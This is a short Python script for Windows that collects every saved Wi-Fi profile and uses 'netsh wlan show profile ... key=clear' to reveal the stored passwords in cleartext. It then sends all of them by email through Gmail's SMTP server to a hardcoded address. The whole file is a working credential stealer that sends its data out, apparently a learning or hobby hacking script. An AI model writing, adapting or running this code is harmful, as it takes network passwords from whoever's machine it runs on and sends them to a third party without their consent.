#!/usr/bin/env python3

import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#command = 'netsh wlan show profile "Redmi Note 12 Pro+ 5G" key=clear'
command = 'netsh wlan show profile'
networks = subprocess.check_output(command, shell=True).decode('utf-8')
networks_name_list = re.findall("(?:All User Profile\s*:\s)(.*)", networks)

result = ""

for network_name in networks_name_list:
    #print(network_name)
    command = f'netsh wlan show profile "{network_name}" key=clear'
    current_result = subprocess.check_output(command, shell=True).decode('utf-8')

    result = result + "\n\n" + current_result

#Consultar app password no google accounts
send_mail("camposjoao345@gmail.com", "********", result)